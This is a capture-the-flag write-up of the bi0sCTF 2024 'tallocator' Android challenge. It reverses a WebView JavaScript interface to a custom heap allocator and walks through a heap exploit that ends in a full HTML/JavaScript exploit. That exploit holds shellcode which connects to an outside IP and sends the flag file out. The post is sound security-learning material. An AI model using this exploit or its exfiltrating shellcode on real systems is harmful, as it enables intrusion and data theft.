---
layout:     post
title:      Tallocator [bi0sCTF 24]
date:       2024-03-03 8:00:00
summary:    WriteUp for challenge tallocator in bi0sCTF
categories: 
- CTF
thumbnail: flag
tags:
- Pwning
---

I had the pleasure of playing bi0sCTF 2024 last weekend. I must say I enjoyed it quite a lot and I was able to get third blood on this challenge which was a first for our newly formed team Team-915.

## Introduction

Without further ado, moving on to the challenge, it had the following files in the handout

```
chinmay@potato:~/Documents/CTF/bi0sCTF24/tallocator$ ls
app.apk  Dockerfile  flag  native.c  readme.md  script.py
```

I was already on the verge of tears seeing an apk but fortunately, the emulator for that apk runs on x86_64 instead of aarch64 so that was a relief. 

Now to make sense out of the files, it seems `script.py` is the file that we interact with. It starts the emulator, starts ADB, installs the apk, starts it's main activity, pushes `flag` into `/data/data/bi0sctf.android.challenge/` and <u>takes from us an input URL and broadcasts it with action </u> `"bi0sctf.android.DATA"`(this will come into picture later since the apk waits for this broadcast). Phew, that's a lot but fortunately, this is quite uninteresting so we don't need to inspect the code.

Now moving on to the star of the show, app.apk, we first decompress it to see if there are any native libraries we need to take care of among other things that might be of interest. 

Surely there are two native libs namely `libnative.so` and `libtallocator.so`. Also, on comparing function names we find that `libnative.so`'s source code is given in the handout as `native.c`

```
app/lib/
├── arm64-v8a
│   ├── libnative.so
│   └── libtallocator.so
├── armeabi-v7a
│   ├── libnative.so
│   └── libtallocator.so
├── x86
│   ├── libnative.so
│   └── libtallocator.so
└── x86_64
    ├── libnative.so
    └── libtallocator.so
```

## Dissecting app.apk

With all that background we are ready to reverse `app.apk`. We use `dex2jar` to transform the apk into a jar file and open it with `jd-gui`. Taking a look at the main activity, we find...

![MainActivity_onCreate](/images/2024-03-03-bi0sctf-tallocator/onCreate.png)

The MainActivity onCreate function does two main things
 - it creates a BroadcastReciever which will recieve the broadcast on action `"bi0sctf.android.DATA"` from `script.py` through ADB which we talked about earlier and then it will load our URL supplied with the broadcast.
 - It creates what is called a JavascriptInterface named `bi0sctf` which means functions with decorator `@JavascriptInterface` can be called directly through Javascript in webpage loaded with `loadURL` in the `WebView w`.

![MainActivity_JavascriptInterface](/images/2024-03-03-bi0sctf-tallocator/javascriptInterface.png)

We can see there are two functions marked as JavascriptInterface namely `secure_talloc` and `secure_tree` both call `talloc` and `tree` after a check on the first parameter which seems to be some sort of key.

![Class_A](/images/2024-03-03-bi0sctf-tallocator/classA.png)

In `class a` we find that the check is implemented in `libnative.so`. Then we inspect `native.c` to find that there are like 7 functions and a `Java_bi0sctf_android_challenge_a_check` function which is imported as `check` in `class a`.

I am ashamed to admit it but a good chunk of time I spent on letting angr run on the check function to find the key, about 4-5 hours, before realising that it was arranging given 16 character long string as a 4x4 matrix and comparing its inverse with a hardcoded value. After a quick wolfram-alpha detour, I found the key... 

```
const key = "50133tbd5mrt1769";
```

The next part is reversing `talloc` and `tree` in `libtallocator.so`.

## reversing talloc and tree

Before we jump into reversing I must mention that the talloc chunk is very similar to malloc chunk. It has a 8 byte size header with the least significant bit representing if the chunk is in use and the first 0x10 bytes when the chunk is free function as Flink and Blink of a doubly linked list.

### talloc

```
  //Java_bi0sctf_android_challenge_MainActivity_talloc
  v6 = a1;
  if ( is_talloc_inited == 1 )
  {
    v7 = (_QWORD *)sbrk_ed;
  }
  else
  {
    a2 = 4096LL;
    qword_4150 = (__int64)mmap((void *)0x41410000, 0x1000uLL, 7, 34, -1, 0LL);
    is_talloc_inited = 1;
    a1 = 4096LL;
    v7 = sbrk(4096LL);
    sbrk_ed = (__int64)v7;
    v7[1] = 0x30LL;
    v7[7] = 0xFC8LL;
    v7[4] = 0x3A63LL;
    wilderness_s = (__int64)(v7 + 7);
  }
  v8 = (void (__fastcall *)(__int64, __int64))v7[5];
  if ( v8 )                                     // ticket to hollywood
  {
    v8(a1, a2);
    perror("Debugger called !!");
  }
```

There are several interesting things to note about `talloc`. If `is_talloc_inited` is not one it will be assigned one and
 - An rwx page will be `mmap`ed at `0x41410000`
 - `sbrk` will be called with size of a page and it's pointer stored in `sbrk_ed`
 - A random flag value `0x3A63` will be written to `sbrk_ed + 0x20`
 - `0xFC8` which is possibly the size of wilderness for this allocator is written to `sbrk_ed + 0x38`
 - pointer to start of wilderness is written in `wilderness_s`

And finally function pointer at `sbrk_ed + 0x28` is called which is initailly 0, lets call this `talloc_hook`

```
  //Java_bi0sctf_android_challenge_MainActivity_talloc
  size = (data_size + 0x17) & 0xFFFFFFFFFFFFFFF0LL;
  if ( (unsigned int)size > 0x150 )
  {
    if ( (unsigned int)(size - 0x151) <= 0xEAE )
    {
      v21 = sbrk_ed;
      curr = *(_QWORD **)(sbrk_ed + 0x18);
      if ( curr )
      {
        diff = 0x7FFFFFFF;
        v24 = 19;
        found = 0LL;
        do
        {
          curr_size = *(curr - 1);
          if ( curr_size >= data_size )
          {
            v26 = size - curr_size;
            v27 = curr_size - size;
            if ( v27 < 0 )
              v27 = v26;
            if ( v27 < diff )
            {
              diff = v27;
              found = curr;
            }
          }
          curr = (_QWORD *)*curr;
          v28 = v24-- != 0;
        }
        while ( curr && v28 );
        if ( found )
        {
          if ( *found )
            *(_QWORD *)(*found + 8LL) = found[1];
          v29 = (_QWORD *)found[1];
          if ( v29 )
            *v29 = *found;
        }
        if ( *(_QWORD **)(v21 + 24) == found )
        {
          *(_QWORD *)(v21 + 24) = *found;
          goto LABEL_44;
        }
LABEL_40:
        if ( found )
          goto LABEL_44;
      }
    }
  }
```

After this, talloc tries to find a free chunk with bigger size and minimum size difference in one of its two free doubly-linked lists (or tree lists if you will ;)) if the size is < 0x150 it goes for free list at `sbrk_ed + 0x10` otherwise if size is less than 0x1000 it goes for `sbrk_ed + 0x18`. Then it proceeds to <u>unsafe unlink</u> the `found` entry. since the list traversal code is identical I have reproduced only code for chunks > 0x150 but < 0x1000 only.

```
  //Java_bi0sctf_android_challenge_MainActivity_talloc
  v30 = (_QWORD *)wilderness_s;
  if ( *(_QWORD *)wilderness_s < size )
  {
    perror("Cant give you more memory !!");
    v30 = (_QWORD *)wilderness_s;
  }
  found = v30 + 1;
  wilderness_s = (__int64)v30 + size;
  *(_QWORD *)((char *)v30 + size) = *v30 - size;
  *v30 = size;
LABEL_44:
  input = (const void *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v6 + 1472LL))(v6, a4, 0LL);
  if ( input_size <= data_size )
    memcpy(found, input, input_size);
  v32 = *(found - 1);
  if ( (v32 & 1) != 0 )
  {
    printf("%s", "Overwriting Chunks !!");
    exit(0);
  }
  *(found - 1) = v32 | 1;
  return found;
```

finally, if there was no `found` entry via list traversal, talloc tries to break off a chunk of the wilderness. in any case at `LABEL_44` found is populated with an address to which the supplied data is copied. And finally we reach our sole security check, a check if the least significant bit of size header is true, it functions as a in-use bit and the allocation can't happen if chunk is in use leading to the program exit.

otherwise the in-use bit is set and the address is returned! Raw pointer in Javascript, pretty neat!

### tree

```
  //Java_bi0sctf_android_challenge_MainActivity_tree
  v3 = *(a3 - 1);
  if ( (v3 & 1) == 0 )
  {
    printf("%s", "Double Tree !!");
    exit(0);
  }
  size = v3 & 0xFFFFFFFFFFFFFFFELL;
  *(a3 - 1) = size;
  v5 = (_QWORD *)wilderness_s;
  if ( (_QWORD *)wilderness_s != (_QWORD *)((char *)a3 + ((__int64)((size << 32) - 0x800000000LL) >> 32)) )
  {
    if ( (int)size > 0x100 )
    {
      v6 = *(_QWORD *)(sbrk_ed + 0x18);
```

tree first checks if the chunk is free if it is, that's a double free and we scoot. Otherwise we clear the in-use bit and then using the convoluted check we check if we are _not_ the last allocation before wilderness, in which case we are put in one of the free list depending on whether our size is < 0x100 (`sbrk_ed + 0x10`) or > 0x100 (`sbrk_ed + 0x18`).

```
  //Java_bi0sctf_android_challenge_MainActivity_tree
    if ( (int)size > 0x100 )
    {
      v6 = *(_QWORD *)(sbrk_ed + 24);
      v7 = sbrk_ed + 24;
      if ( v6 )
        goto LABEL_5;
    }
    else
    {
      v6 = *(_QWORD *)(sbrk_ed + 16);
      v7 = sbrk_ed + 16;
      if ( v6 )
      {
LABEL_5:
        *a3 = v6;
        a3[1] = v7;
        *(_QWORD *)(*(_QWORD *)v7 + 8LL) = a3;
LABEL_9:
        *(_QWORD *)v7 = a3;
        return 0LL;
      }
    }
    *a3 = 0LL;
    a3[1] = v7;
    goto LABEL_9;
```

Otherwise, if we are the chunk before wilderness, the wilderness is shrunk.

```
  //Java_bi0sctf_android_challenge_MainActivity_tree
  wilderness_s -= (int)size;
  *(_QWORD *)wilderness_s = *v5 - (int)size;
  *v5 = 0LL;
  return 0LL;
```

## Exploitation

The road to exploitation is surprisingly simple from here. we need to:
 - Write shellcode that reads the flag file and sends it to our nc listener, to the rwx allocation at `0x41410008`
 - Write `0x41410008` to the `talloc_hook`

Note that we are writing shellcode to `0x41410008` instead of `0x41410000` because we are going to allocate a fake chunk at `0x41410008` if we allocate it at `0x41410000` 8 bytes before it where the header should be will be unmapped memory which will cause segfault.

### Writing Shellcode

Since, all pieces are in place, let's examine the final exploit step by step now.

```
var arr = new Uint8Array(0x28);
for (var i = 0; i < 0x28; i++) {
  arr[i] = 0;
}
arr[0x18] = 1;
arr[0x19] = 1;
arr[0x20] = 9;
arr[0x22] = 0x41;
arr[0x23] = 0x41;

var ret = bi0sctf.secure_talloc(key, 0x28, arr);
bi0sctf.secure_talloc(key, 0x10, arr);
```
![1.png](/images/2024-03-03-bi0sctf-tallocator/1.png)

first I allocated a chunk of size 0x28 (size header 0x30) and a chunk of size 0x10 (size header 0x20), the latter prevents coalesence of the former with wilderness on free. Also, the 0x28 byte chunk contains a faux chunk header followed by address 0x41410009 at offset 0x18. The result should look as above.

```
bi0sctf.secure_tree(key, ret + 0x20);
bi0sctf.secure_tree(key, ret);
```
Assume that `sbrk_ed = 0x6900000000` then we get the following situation where our faux chunk is successfully injected into the small allocation list after the first `secure_tree`
![2.png](/images/2024-03-03-bi0sctf-tallocator/2.png)
After the second `secure_tree` this is the situation.
![3.png](/images/2024-03-03-bi0sctf-tallocator/3.png)

Now we reallocate allocation #1 and overwrite into faux chunk writing address 0x41410009 into it at it's offset zero.
```
arr[0x18] = 0;

bi0sctf.secure_talloc(key, 0x28, arr);
```
The state of the list is as shown.
![4.png](/images/2024-03-03-bi0sctf-tallocator/4.png)

Now the list is in desirable state to use the 1 bit write at the end of talloc to forge a chunk of effective size 0x100 at 0x41410008. We then execute.
```
bi0sctf.secure_talloc(key, -23, arr);
```
this will trigger talloc to find an allocation with size header zero or more, `0x41410009` will be picked becuase the value of `curr_size` for it will be 0 and it will minimize the difference between `size` and `curr_size`. Thus 1 bit will be written at `0x41410001` as the in-use bit.

![5.png](/images/2024-03-03-bi0sctf-tallocator/5.png)

then we run the following instructions.

```
arr[0x20] = 8;

bi0sctf.secure_tree(key, ret);
bi0sctf.secure_talloc(key, 0x28, arr);
```

to bring talloc to this state.

![6.png](/images/2024-03-03-bi0sctf-tallocator/6.png)

from here it is easy to see that allocations of size `0xf0` will first pop our faux chunk and then address `0x41410008`. We execute...

```
bi0sctf.secure_talloc(key, 0xf0, smarr);
bi0sctf.secure_talloc(key, 0xf0, sharr);
```
where `smarr` is a small array containing `0x41410008` address but this can be any arbitrary Uint8Array and `sharr` is the shellcode containing array.

And in this way we have written shellcode successfully to address `0x41410008`. Next we have to overwrite `talloc_hook` which is surprisingly simple.

### Overwriting talloc_hook

We noted earlier that constant `0x3A63` is written at `sbrk_ed + 0x20`. The initial layout near `sbrk_ed` is as follows

![7.png](/images/2024-03-03-bi0sctf-tallocator/7.png)

Since the least significant bit of `0x3A63` is 1 we can free `sbrk + 0x28` and it will be put into the big allocation list.

```
bi0sctf.secure_tree(key, ret - 0x18);
```

after this `secure_tree` the state of talloc is 

![8.png](/images/2024-03-03-bi0sctf-tallocator/8.png)

Now we can request any allocation of size greater than 0x150 and `sbrk + 0x28` or `talloc_hook` will be returned. Also note that `talloc_hook` is still zero saving us from any unwanted side effects.

```
bi0sctf.secure_talloc(key, 0x160, smarr);
```

Now `talloc_hook` is overwritten with `0x41410008`. Bazinga!

![9.png](/images/2024-03-03-bi0sctf-tallocator/9.png)

trigger `talloc_hook`

```
bi0sctf.secure_talloc(key, 0x10, smarr);
```

### Victory?

The only problem that remained was that I did not have anywhere to host a nc listener to get the flag. I tried all possible ways and after a bucket load of disappointments and frustration, I finally used ngrok to tcp forward traffic to a local listener and hosted my exploit on this very blog. And finally, FLAG!!!!

![Victory!](/images/2024-03-03-bi0sctf-tallocator/victory.png)

```
bi0sctf{y0u_h4v3_t4ll0c3d_y0ur_w4y_thr0ugh_1281624072}
```

## Full Exploit
```
<html>
<Body>
<script>
const key = "50133tbd5mrt1769";
const shellcode = [0x48, 0x31, 0xC0, 0x48, 0x83, 0xC0, 0x29, 0x48, 0x31, 0xFF, 0x48, 0x89, 0xFA, 0x48, 0x83, 0xC7, 0x02, 0x48, 0x31, 0xF6, 0x48, 0x83, 0xC6, 0x01, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x50, 0x48, 0x83, 0xC0, 0x02, 0xC7, 0x44, 0x24, 0xFC, 0xC0, 0xA8, 0x01, 0x02, 0x66, 0xC7, 0x44, 0x24, 0xFA, 0x11, 0x5C, 0x66, 0x89, 0x44, 0x24, 0xF8, 0x48, 0x83, 0xEC, 0x08, 0x48, 0x83, 0xC0, 0x28, 0x48, 0x89, 0xE6, 0x48, 0x31, 0xD2, 0x48, 0x83, 0xC2, 0x10, 0x0F, 0x05, 0x57, 0x48, 0x31, 0xD2, 0x48, 0x89, 0xD6, 0x48, 0x8D, 0x3D, 0x19, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x58, 0x0F, 0x05, 0x5F, 0x48, 0x89, 0xC6, 0x48, 0x31, 0xD2, 0x68, 0xE8, 0x03, 0x00, 0x00, 0x41, 0x5A, 0x6A, 0x28, 0x58, 0x0F, 0x05, 0xCC, 0x2F, 0x64, 0x61, 0x74, 0x61, 0x2F, 0x64, 0x61, 0x74, 0x61, 0x2F, 0x62, 0x69, 0x30, 0x73, 0x63, 0x74, 0x66, 0x2E, 0x61, 0x6E, 0x64, 0x72, 0x6F, 0x69, 0x64, 0x2E, 0x63, 0x68, 0x61, 0x6C, 0x6C, 0x65, 0x6E, 0x67, 0x65, 0x2F, 0x66, 0x6C, 0x61, 0x67, 0x00];

var arr = new Uint8Array(0x28);
for (var i = 0; i < 0x28; i++) {
  arr[i] = 0;
}
arr[0x18] = 1;
arr[0x19] = 1;
arr[0x20] = 9;
arr[0x22] = 0x41;
arr[0x23] = 0x41;

var ret = bi0sctf.secure_talloc(key, 0x28, arr);
bi0sctf.secure_talloc(key, 0x10, arr);
bi0sctf.secure_tree(key, ret + 0x20);
bi0sctf.secure_tree(key, ret);

arr[0x18] = 0;

bi0sctf.secure_talloc(key, 0x28, arr);
bi0sctf.secure_talloc(key, -23, arr);

var sharr = new Uint8Array(shellcode.length);
for (var i = 0; i < shellcode.length; i++) {
  sharr[i] = shellcode[i];
}
// substitute IP
sharr[0x29] = 192;
sharr[0x2a] = 168;
sharr[0x2b] = 1;
sharr[0x2c] = 1;

// substitute port
sharr[0x32] = 0x00;
sharr[0x33] = 80;

arr[0x20] = 8;

bi0sctf.secure_tree(key, ret);
bi0sctf.secure_talloc(key, 0x28, arr);

var smarr = new Uint8Array(8);
for (var i = 0; i < 8; i++) {
  smarr[i] = 0;
}
smarr[0] = 8;
smarr[2] = 0x41;
smarr[3] = 0x41;

bi0sctf.secure_talloc(key, 0xf0, smarr);
bi0sctf.secure_talloc(key, 0xf0, sharr);

bi0sctf.secure_tree(key, ret - 0x18);
bi0sctf.secure_talloc(key, 0x160, smarr);

bi0sctf.secure_talloc(key, 0x10, smarr);
</script>
</Body>
</html>
```
